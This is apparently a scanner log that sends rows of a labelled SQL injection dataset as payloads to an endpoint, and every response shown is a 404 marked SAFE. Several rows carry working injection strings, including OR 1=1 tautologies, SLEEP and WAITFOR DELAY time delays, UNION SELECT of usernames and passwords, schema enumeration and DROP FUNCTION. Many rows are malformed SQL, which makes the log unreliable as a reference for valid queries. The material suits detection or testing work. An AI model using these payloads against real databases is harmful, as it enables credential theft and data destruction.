SQL Injection Dataset Results
Start Time: 2026-04-05 15:32:05.442580

[1] SAFE | Status:404 | Time:0.008s | Payload: sql_query,injection_type,vulnerability_status,sql_command,target_table,selected_columns,comparison_operator,logical_operator,sql_comment_syntax
[473] SAFE | Status:404 | Time:0.005s | Payload: EXEC('SELECT MIN(created_at) FROM passwords WHERE id < 1 OR 1=1--') #,boolean-based,Yes,EXEC,passwords,MIN(created_at),<,,#
[474] SAFE | Status:404 | Time:0.007s | Payload: "CALL user_id, product_id FROM sessions WHERE email BETWEEN 'pending' AND email BETWEEN NULL",None_Type,No,CALL,sessions,"user_id, product_id",BETWEEN,AND,
[475] SAFE | Status:404 | Time:0.005s | Payload: "SELECT id, email FROM employees WHERE id >= 1 OR OR (SELECT DATABASE()) = 'mydatabase' -- #",meta_based,Yes,SELECT,employees,"id, email",>=,OR,#
[476] SAFE | Status:404 | Time:0.004s | Payload: "EXEC id, email FROM admin WHERE email >= 'shipped' AND email >= 1",None_Type,No,EXEC,admin,"id, email",>=,AND,
[477] SAFE | Status:404 | Time:0.007s | Payload: "UPDATE id, email FROM accounts WHERE created_at <= 'shipped' OR created_at <= 'pending'",None_Type,No,UPDATE,accounts,"id, email",<=,OR,
[478] SAFE | Status:404 | Time:0.01s | Payload: "SELECT id, email FROM credentials WHERE product_id BETWEEN 'pending' OR product_id BETWEEN 'shipped'",None_Type,No,SELECT,credentials,"id, email",BETWEEN,OR,
[479] SAFE | Status:404 | Time:0.012s | Payload: "INSERT id, email FROM login WHERE created_at BETWEEN 'pending' NOT created_at BETWEEN 1",None_Type,No,INSERT,login,"id, email",BETWEEN,NOT,
[480] SAFE | Status:404 | Time:0.011s | Payload: "INSERT price, status FROM employees WHERE status <= NULL NOT status <= 1",None_Type,No,INSERT,employees,"price, status",<=,NOT,
[481] SAFE | Status:404 | Time:0.01s | Payload: "SELECT created_at, updated_at FROM sessions WHERE product_id BETWEEN NULL AND product_id BETWEEN NULL",None_Type,No,SELECT,sessions,"created_at, updated_at",BETWEEN,AND,
[482] SAFE | Status:404 | Time:0.008s | Payload: SELECT MAX(price) FROM transactions WHERE created_at IS NULL AND created_at IS NULL,None_Type,No,SELECT,transactions,MAX(price),IS NULL,AND,
[483] SAFE | Status:404 | Time:0.009s | Payload: SELECT MAX(price) FROM accounts WHERE email LIKE 'pending' NOT email LIKE NULL,None_Type,No,SELECT,accounts,MAX(price),LIKE,NOT,
[484] SAFE | Status:404 | Time:0.006s | Payload: DELETE FROM employees WHERE id <= 1 LIKE HAVING 1=0,Error-Based,Yes,DELETE,employees,*,<=,LIKE,
[485] SAFE | Status:404 | Time:0.006s | Payload: "SELECT created_at, updated_at FROM transactions WHERE order_id >= 1 NOT order_id >= 'pending'",None_Type,No,SELECT,transactions,"created_at, updated_at",>=,NOT,
[486] SAFE | Status:404 | Time:0.005s | Payload: EXEC('SELECT * FROM admin WHERE id = 1 NOT &&SLEEP(5)#'),Time-Based,Yes,EXEC,admin,*,=,NOT,
[487] SAFE | Status:404 | Time:0.005s | Payload: "SELECT * FROM sessions WHERE id != 1 NOT UNION SELECT null, table_name FROM information_schema.tables -- #",meta_based,Yes,SELECT,sessions,*,!=,NOT,#
[488] SAFE | Status:404 | Time:0.004s | Payload: "SELECT user_id, product_id FROM accounts WHERE id >= 1 OR 1=1-- #",boolean-based,Yes,SELECT,accounts,"user_id, product_id",>=,,#
[489] SAFE | Status:404 | Time:0.007s | Payload: UPDATE MAX(price) FROM payments WHERE id LIKE 1 OR id LIKE 1,None_Type,No,UPDATE,payments,MAX(price),LIKE,OR,
[490] SAFE | Status:404 | Time:0.005s | Payload: "INSERT created_at, updated_at FROM accounts WHERE product_id > NULL AND product_id > '2024-01-01'",None_Type,No,INSERT,accounts,"created_at, updated_at",>,AND,
[491] SAFE | Status:404 | Time:0.008s | Payload: SELECT MIN(created_at) FROM payments WHERE status BETWEEN 'safe' AND status BETWEEN NULL,None_Type,No,SELECT,payments,MIN(created_at),BETWEEN,AND,
[492] SAFE | Status:404 | Time:0.007s | Payload: DELETE MAX(price) FROM sessions WHERE order_id >= 1 AND order_id >= NULL,None_Type,No,DELETE,sessions,MAX(price),>=,AND,
[493] SAFE | Status:404 | Time:0.007s | Payload: DELETE * FROM payments WHERE order_id = NULL AND order_id = '2024-01-01',None_Type,No,DELETE,payments,*,=,AND,
[494] SAFE | Status:404 | Time:0.007s | Payload: DELETE MIN(created_at) FROM passwords WHERE email > 'test@example.com' OR email > 'shipped',None_Type,No,DELETE,passwords,MIN(created_at),>,OR,
[495] SAFE | Status:404 | Time:0.004s | Payload: SELECT MIN(created_at) FROM transactions WHERE id > 1 NOT SLEEP(5)-- #,Time-Based,Yes,SELECT,transactions,MIN(created_at),>,NOT,#
[496] SAFE | Status:404 | Time:0.007s | Payload: "SELECT created_at, updated_at FROM employees WHERE id > 1 %' AND 8310=8310 AND '%'=' --",Error-Based,Yes,SELECT,employees,"created_at, updated_at",>,,--
[497] SAFE | Status:404 | Time:0.005s | Payload: SELECT MAX(price) FROM credentials WHERE user_id LIKE 'active' NOT user_id LIKE 'test@example.com',None_Type,No,SELECT,credentials,MAX(price),LIKE,NOT,
[498] SAFE | Status:404 | Time:0.004s | Payload: SELECT COUNT(*) FROM employees WHERE id < 1 AND '&&SLEEP(5)&&'1 --,Time-Based,Yes,SELECT,employees,COUNT(*),<,AND,--
[499] SAFE | Status:404 | Time:0.007s | Payload: SELECT COUNT(*) FROM employees WHERE id != 1 NOT AND 1=1 -- - --,meta_based,Yes,SELECT,employees,COUNT(*),!=,NOT,--
[500] SAFE | Status:404 | Time:0.005s | Payload: "INSERT price, status FROM sessions WHERE email != 'pending' OR email != 'active'",None_Type,No,INSERT,sessions,"price, status",!=,OR,
[501] SAFE | Status:404 | Time:0.006s | Payload: "SELECT id, email FROM credentials WHERE id < 1 OR ORDER BY 29",Union-Based,Yes,SELECT,credentials,"id, email",<,OR,
[502] SAFE | Status:404 | Time:0.007s | Payload: "EXEC price, status FROM credentials WHERE status IN NULL AND status IN 1",None_Type,No,EXEC,credentials,"price, status",IN,AND,
[503] SAFE | Status:404 | Time:0.004s | Payload: SELECT COUNT(*) FROM login WHERE id != 1 OR ORDER BY 28-- --,Error-Based,Yes,SELECT,login,COUNT(*),!=,OR,--
[504] SAFE | Status:404 | Time:0.007s | Payload: INSERT COUNT(*) FROM login WHERE price IN 'active' NOT price IN 'pending',None_Type,No,INSERT,login,COUNT(*),IN,NOT,
[505] SAFE | Status:404 | Time:0.006s | Payload: "DELETE price, status FROM sessions WHERE price < 'safe' AND price < 'safe'",None_Type,No,DELETE,sessions,"price, status",<,AND,
[506] SAFE | Status:404 | Time:0.007s | Payload: INSERT MIN(created_at) FROM payments WHERE updated_at <= 'test@example.com' OR updated_at <= 'active',None_Type,No,INSERT,payments,MIN(created_at),<=,OR,
[507] SAFE | Status:404 | Time:0.005s | Payload: "SELECT id, email FROM transactions WHERE id != 1 LIKE ;waitfor delay '0:0:5'-- #",Time-Based,Yes,SELECT,transactions,"id, email",!=,LIKE,#
[508] SAFE | Status:404 | Time:0.005s | Payload: "DELETE FROM accounts WHERE id < 1 OR UNION SELECT null, username, password FROM users -- #",meta_based,Yes,DELETE,accounts,,<,OR,#
[509] SAFE | Status:404 | Time:0.008s | Payload: DELETE MAX(price) FROM login WHERE price != NULL NOT price != 'pending',None_Type,No,DELETE,login,MAX(price),!=,NOT,
[510] SAFE | Status:404 | Time:0.006s | Payload: UPDATE passwords SET name = 'admin' LIKE ORDER BY 23-- WHERE id > 1 --,Error-Based,Yes,UPDATE,passwords,*,>,LIKE,--
[511] SAFE | Status:404 | Time:0.01s | Payload: DELETE FROM credentials WHERE id >= 1 ' AnD SLEEP(5) ANd '1 --,Time-Based,Yes,DELETE,credentials,*,>=,,--
[512] SAFE | Status:404 | Time:0.007s | Payload: UPDATE payments SET username = 'test' OR ORDER BY 8 WHERE id <= 1 #,Union-Based,Yes,UPDATE,payments,*,<=,OR,#
[513] SAFE | Status:404 | Time:0.008s | Payload: EXEC * FROM payments WHERE order_id LIKE 'safe' NOT order_id LIKE 1,None_Type,No,EXEC,payments,*,LIKE,NOT,
[514] SAFE | Status:404 | Time:0.006s | Payload: DELETE * FROM login WHERE price IN NULL AND price IN 'test@example.com',None_Type,No,DELETE,login,*,IN,AND,
[515] SAFE | Status:404 | Time:0.01s | Payload: "SELECT COUNT(*) FROM passwords WHERE id < 1 1)) or benchmark(10000000,MD5(1))#",Time-Based,Yes,SELECT,passwords,COUNT(*),<,,
[516] SAFE | Status:404 | Time:0.007s | Payload: "SELECT created_at, updated_at FROM admin WHERE id > 1 NOT ORDER BY 13#",Error-Based,Yes,SELECT,admin,"created_at, updated_at",>,NOT,
[517] SAFE | Status:404 | Time:0.008s | Payload: DELETE MIN(created_at) FROM users WHERE updated_at BETWEEN 'shipped' OR updated_at BETWEEN 'active',None_Type,No,DELETE,users,MIN(created_at),BETWEEN,OR,
[518] SAFE | Status:404 | Time:0.008s | Payload: INSERT COUNT(*) FROM admin WHERE user_id > 'safe' AND user_id > 'test@example.com',None_Type,No,INSERT,admin,COUNT(*),>,AND,
[519] SAFE | Status:404 | Time:0.008s | Payload: EXEC COUNT(*) FROM sessions WHERE price <= 'safe' OR price <= NULL,None_Type,No,EXEC,sessions,COUNT(*),<=,OR,
[520] SAFE | Status:404 | Time:0.006s | Payload: "SELECT created_at, updated_at FROM passwords WHERE order_id LIKE 1 OR order_id LIKE '2024-01-01'",None_Type,No,SELECT,passwords,"created_at, updated_at",LIKE,OR,
[521] SAFE | Status:404 | Time:0.008s | Payload: EXEC('SELECT COUNT(*) FROM employees WHERE id = 1 OR 3409=3409 AND (1=1)'),boolean-based,Yes,EXEC,employees,COUNT(*),=,,
[522] SAFE | Status:404 | Time:0.007s | Payload: SELECT * FROM payments WHERE id = 1 OR # from wapiti #,Time-Based,Yes,SELECT,payments,*,=,OR,#
[523] SAFE | Status:404 | Time:0.01s | Payload: SELECT MAX(price) FROM passwords WHERE status >= NULL NOT status >= 'shipped',None_Type,No,SELECT,passwords,MAX(price),>=,NOT,
[524] SAFE | Status:404 | Time:0.007s | Payload: CALL MIN(created_at) FROM login WHERE created_at > 'active' NOT created_at > 'shipped',None_Type,No,CALL,login,MIN(created_at),>,NOT,
[525] SAFE | Status:404 | Time:0.007s | Payload: "UPDATE price, status FROM payments WHERE updated_at >= NULL AND updated_at >= 'shipped'",None_Type,No,UPDATE,payments,"price, status",>=,AND,
[526] SAFE | Status:404 | Time:0.011s | Payload: UPDATE COUNT(*) FROM accounts WHERE email IN 'safe' NOT email IN 'active',None_Type,No,UPDATE,accounts,COUNT(*),IN,NOT,
[527] SAFE | Status:404 | Time:0.01s | Payload: CALL * FROM users WHERE order_id != '2024-01-01' NOT order_id != 'shipped',None_Type,No,CALL,users,*,!=,NOT,
[528] SAFE | Status:404 | Time:0.007s | Payload: UPDATE MIN(created_at) FROM passwords WHERE status <= 1 OR status <= 'safe',None_Type,No,UPDATE,passwords,MIN(created_at),<=,OR,
[529] SAFE | Status:404 | Time:0.008s | Payload: "EXEC('SELECT id, email FROM sessions WHERE id <= 1 OR 3409=3409 AND (1=1) AND (ASCII(SUBSTRING('admin',1,1)) = 97) -- Check for 'a'') #",boolean-based,Yes,EXEC,sessions,"id, email",<=,,#
[530] SAFE | Status:404 | Time:0.009s | Payload: "INSERT user_id, product_id FROM admin WHERE product_id != 'pending' OR product_id != 'pending'",None_Type,No,INSERT,admin,"user_id, product_id",!=,OR,
[531] SAFE | Status:404 | Time:0.008s | Payload: "CALL created_at, updated_at FROM payments WHERE updated_at BETWEEN NULL NOT updated_at BETWEEN 'safe'",None_Type,No,CALL,payments,"created_at, updated_at",BETWEEN,NOT,
[532] SAFE | Status:404 | Time:0.01s | Payload: UPDATE * FROM transactions WHERE product_id < 'safe' AND product_id < 'safe',None_Type,No,UPDATE,transactions,*,<,AND,
[533] SAFE | Status:404 | Time:0.012s | Payload: "CALL created_at, updated_at FROM credentials WHERE email < 'test@example.com' NOT email < 'active'",None_Type,No,CALL,credentials,"created_at, updated_at",<,NOT,
[534] SAFE | Status:404 | Time:0.007s | Payload: "CALL price, status FROM sessions WHERE product_id >= 'safe' NOT product_id >= 'active'",None_Type,No,CALL,sessions,"price, status",>=,NOT,
[535] SAFE | Status:404 | Time:0.01s | Payload: UPDATE COUNT(*) FROM login WHERE id IN 'safe' AND id IN 'safe',None_Type,No,UPDATE,login,COUNT(*),IN,AND,
[536] SAFE | Status:404 | Time:0.01s | Payload: "DELETE price, status FROM passwords WHERE product_id >= 'test@example.com' AND product_id >= 1",None_Type,No,DELETE,passwords,"price, status",>=,AND,
[537] SAFE | Status:404 | Time:0.008s | Payload: "SELECT id, email FROM accounts WHERE id < 1 NOT ORDER BY 29--",Error-Based,Yes,SELECT,accounts,"id, email",<,NOT,
[538] SAFE | Status:404 | Time:0.01s | Payload: "EXEC price, status FROM employees WHERE id > 'test@example.com' OR id > 'pending'",None_Type,No,EXEC,employees,"price, status",>,OR,
[539] SAFE | Status:404 | Time:0.009s | Payload: SELECT * FROM admin WHERE id <= 1 ORDER BY 17#,Error-Based,Yes,SELECT,admin,*,<=,,
[540] SAFE | Status:404 | Time:0.011s | Payload: "INSERT user_id, product_id FROM payments WHERE email BETWEEN '2024-01-01' NOT email BETWEEN 'shipped'",None_Type,No,INSERT,payments,"user_id, product_id",BETWEEN,NOT,
[541] SAFE | Status:404 | Time:0.009s | Payload: DELETE * FROM sessions WHERE status BETWEEN 'active' NOT status BETWEEN 1,None_Type,No,DELETE,sessions,*,BETWEEN,NOT,
[542] SAFE | Status:404 | Time:0.007s | Payload: "CALL price, status FROM credentials WHERE user_id LIKE 'pending' OR user_id LIKE '2024-01-01'",None_Type,No,CALL,credentials,"price, status",LIKE,OR,
[543] SAFE | Status:404 | Time:0.009s | Payload: "SELECT user_id, product_id FROM payments WHERE order_id >= 'active' OR order_id >= 'pending'",None_Type,No,SELECT,payments,"user_id, product_id",>=,OR,
[544] SAFE | Status:404 | Time:0.005s | Payload: "DELETE user_id, product_id FROM users WHERE user_id IN 1 OR user_id IN '2024-01-01'",None_Type,No,DELETE,users,"user_id, product_id",IN,OR,
[545] SAFE | Status:404 | Time:0.005s | Payload: "UPDATE id, email FROM passwords WHERE created_at IN 'shipped' OR created_at IN 'active'",None_Type,No,UPDATE,passwords,"id, email",IN,OR,
[546] SAFE | Status:404 | Time:0.008s | Payload: "DELETE price, status FROM payments WHERE order_id <= 'shipped' NOT order_id <= '2024-01-01'",None_Type,No,DELETE,payments,"price, status",<=,NOT,
[547] SAFE | Status:404 | Time:0.006s | Payload: "EXEC('SELECT MIN(created_at) FROM employees WHERE id = 1 AND UNION SELECT username, password, null, null FROM users--') #",stackqueries_based,Yes,EXEC,employees,MIN(created_at),=,AND,#
[548] SAFE | Status:404 | Time:0.005s | Payload: DELETE MIN(created_at) FROM admin WHERE id IN 1 AND id IN 'test@example.com',None_Type,No,DELETE,admin,MIN(created_at),IN,AND,
[549] SAFE | Status:404 | Time:0.008s | Payload: DELETE COUNT(*) FROM employees WHERE status LIKE '2024-01-01' NOT status LIKE 'test@example.com',None_Type,No,DELETE,employees,COUNT(*),LIKE,NOT,
[550] SAFE | Status:404 | Time:0.009s | Payload: DELETE FROM passwords WHERE id = 1 NOT IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--,Error-Based,Yes,DELETE,passwords,*,=,NOT,
[551] SAFE | Status:404 | Time:0.008s | Payload: "SELECT id, email FROM employees WHERE user_id >= 'active' AND user_id >= 'test@example.com'",None_Type,No,SELECT,employees,"id, email",>=,AND,
[552] SAFE | Status:404 | Time:0.01s | Payload: "INSERT INTO employees (id, username) VALUES (1, NOT ORDER BY 16--) #",Error-Based,Yes,INSERT,employees,*,=,NOT,#
[553] SAFE | Status:404 | Time:0.006s | Payload: SELECT MIN(created_at) FROM transactions WHERE status < 'safe' AND status < 1,None_Type,No,SELECT,transactions,MIN(created_at),<,AND,
[554] SAFE | Status:404 | Time:0.01s | Payload: EXEC MAX(price) FROM users WHERE updated_at BETWEEN '2024-01-01' OR updated_at BETWEEN NULL,None_Type,No,EXEC,users,MAX(price),BETWEEN,OR,
[555] SAFE | Status:404 | Time:0.009s | Payload: UPDATE COUNT(*) FROM users WHERE created_at <= 'active' NOT created_at <= 'pending',None_Type,No,UPDATE,users,COUNT(*),<=,NOT,
[556] SAFE | Status:404 | Time:0.011s | Payload: SELECT MIN(created_at) FROM payments WHERE id != 1 OR IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl-- --,Error-Based,Yes,SELECT,payments,MIN(created_at),!=,OR,--
[557] SAFE | Status:404 | Time:0.011s | Payload: "DELETE price, status FROM sessions WHERE updated_at <= 'safe' AND updated_at <= 1",None_Type,No,DELETE,sessions,"price, status",<=,AND,
[558] SAFE | Status:404 | Time:0.009s | Payload: "UPDATE id, email FROM credentials WHERE order_id BETWEEN 'pending' NOT order_id BETWEEN 'safe'",None_Type,No,UPDATE,credentials,"id, email",BETWEEN,NOT,
[559] SAFE | Status:404 | Time:0.009s | Payload: "INSERT INTO login (id, username) VALUES (1, LIKE ORDER BY 24--) #",Error-Based,Yes,INSERT,login,*,=,LIKE,#
[560] SAFE | Status:404 | Time:0.01s | Payload: EXEC MAX(price) FROM transactions WHERE user_id <= 'test@example.com' NOT user_id <= 1,None_Type,No,EXEC,transactions,MAX(price),<=,NOT,
[561] SAFE | Status:404 | Time:0.008s | Payload: "SELECT id, email FROM employees WHERE id <= 'safe' NOT id <= NULL",None_Type,No,SELECT,employees,"id, email",<=,NOT,
[562] SAFE | Status:404 | Time:0.01s | Payload: UPDATE transactions SET username = 'test' NOT ORDER BY 24 WHERE id = 1 #,Union-Based,Yes,UPDATE,transactions,*,=,NOT,#
[563] SAFE | Status:404 | Time:0.006s | Payload: "EXEC id, email FROM users WHERE status > '2024-01-01' NOT status > '2024-01-01'",None_Type,No,EXEC,users,"id, email",>,NOT,
[564] SAFE | Status:404 | Time:0.008s | Payload: "DELETE id, email FROM sessions WHERE product_id = '2024-01-01' OR product_id = 'safe'",None_Type,No,DELETE,sessions,"id, email",=,OR,
[565] SAFE | Status:404 | Time:0.006s | Payload: "SELECT user_id, product_id FROM transactions WHERE email != 'safe' AND email != '2024-01-01'",None_Type,No,SELECT,transactions,"user_id, product_id",!=,AND,
[566] SAFE | Status:404 | Time:0.008s | Payload: SELECT * FROM payments WHERE id > 1 LIKE AND (SELECT user()) = 'root' -- --,meta_based,Yes,SELECT,payments,*,>,LIKE,--
[567] SAFE | Status:404 | Time:0.006s | Payload: DELETE MIN(created_at) FROM accounts WHERE user_id IN '2024-01-01' NOT user_id IN '2024-01-01',None_Type,No,DELETE,accounts,MIN(created_at),IN,NOT,
[568] SAFE | Status:404 | Time:0.008s | Payload: INSERT * FROM login WHERE email >= 'test@example.com' NOT email >= 'pending',None_Type,No,INSERT,login,*,>=,NOT,
[569] SAFE | Status:404 | Time:0.005s | Payload: "SELECT id, email FROM transactions WHERE id = 1 NOT ORDER BY 24 --",Union-Based,Yes,SELECT,transactions,"id, email",=,NOT,--
[570] SAFE | Status:404 | Time:0.009s | Payload: DELETE FROM employees WHERE id < 1 IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl-- #,Error-Based,Yes,DELETE,employees,*,<,,#
[571] SAFE | Status:404 | Time:0.012s | Payload: "SELECT id, email FROM credentials WHERE price > 'safe' AND price > 'safe'",None_Type,No,SELECT,credentials,"id, email",>,AND,
[572] SAFE | Status:404 | Time:0.008s | Payload: "SELECT price, status FROM sessions WHERE email BETWEEN 1 AND email BETWEEN NULL",None_Type,No,SELECT,sessions,"price, status",BETWEEN,AND,
[573] SAFE | Status:404 | Time:0.01s | Payload: "SELECT id, email FROM admin WHERE id >= 1 pg_SLEEP(5)--",Time-Based,Yes,SELECT,admin,"id, email",>=,,
[574] SAFE | Status:404 | Time:0.009s | Payload: CALL MIN(created_at) FROM passwords WHERE email >= 'pending' OR email >= 'safe',None_Type,No,CALL,passwords,MIN(created_at),>=,OR,
[575] SAFE | Status:404 | Time:0.01s | Payload: "UPDATE created_at, updated_at FROM sessions WHERE user_id < 'test@example.com' OR user_id < '2024-01-01'",None_Type,No,UPDATE,sessions,"created_at, updated_at",<,OR,
[576] SAFE | Status:404 | Time:0.012s | Payload: "EXEC id, email FROM transactions WHERE created_at BETWEEN 'pending' OR created_at BETWEEN NULL",None_Type,No,EXEC,transactions,"id, email",BETWEEN,OR,
[577] SAFE | Status:404 | Time:0.01s | Payload: INSERT MAX(price) FROM sessions WHERE status LIKE 'test@example.com' NOT status LIKE NULL,None_Type,No,INSERT,sessions,MAX(price),LIKE,NOT,
[578] SAFE | Status:404 | Time:0.013s | Payload: UPDATE MAX(price) FROM payments WHERE product_id BETWEEN '2024-01-01' NOT product_id BETWEEN 'test@example.com',None_Type,No,UPDATE,payments,MAX(price),BETWEEN,NOT,
